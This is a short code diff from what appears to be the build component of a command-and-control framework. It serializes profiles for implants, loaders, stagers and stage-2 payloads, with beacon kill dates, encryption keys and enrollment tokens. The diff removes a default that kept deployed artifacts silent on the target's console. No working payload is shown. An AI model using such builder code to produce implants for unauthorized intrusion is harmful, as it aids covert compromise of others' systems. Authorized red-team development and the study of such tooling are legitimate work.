@@ -341,12 +341,6 @@ public sealed class DotNetBuildUnit : IBuildUnit
                 ? "aesgcm"
                 : "none",
             ["verbs"] = verbs,
-            // A deployed artifact narrates nothing: its console belongs to the
-            // target, not to the operator. Quiet is the baked default for every
-            // pipeline build; a debugging run re-enables the narration by
-            // presetting ROD_QUIET=0 in the environment before launch (the bake
-            // only fills the variable when it is unset).
-            ["quiet"] = "true",
         };
         // The AES-GCM envelope key, when the profile asked for the encrypted
         // envelope: one base64 value carrying the key id and the key, baked the
@@ -398,14 +392,10 @@ public sealed class DotNetBuildUnit : IBuildUnit
             ["stage2Sha256"] = @params.Stage2.Sha256,
             // Empty string is the open-ended shape, same as the implant profile.
             ["killDate"] = @params.Beacon.KillDate?.ToString("O") ?? "",
-            // Same quiet default as the implant profile: a deployed loader
-            // narrates nothing, and ROD_QUIET=0 preset before launch brings
-            // the narration back for a debugging run.
-            ["quiet"] = "true",
         };
-        // The stager presents its own baked token for the fetch (verified, not
-        // spent); the stage-2 it launches spends the token baked into the
-        // stage-2's own profile.
+        // The stager presents its own baked token for the fetch; the stage-2
+        // it launches enrolls on the token baked into the stage-2's own
+        // profile.
         if (@params.TokenSecret is { } tokenSecret)
             map["token"] = tokenSecret;
         var json = JsonSerializer.Serialize(map);
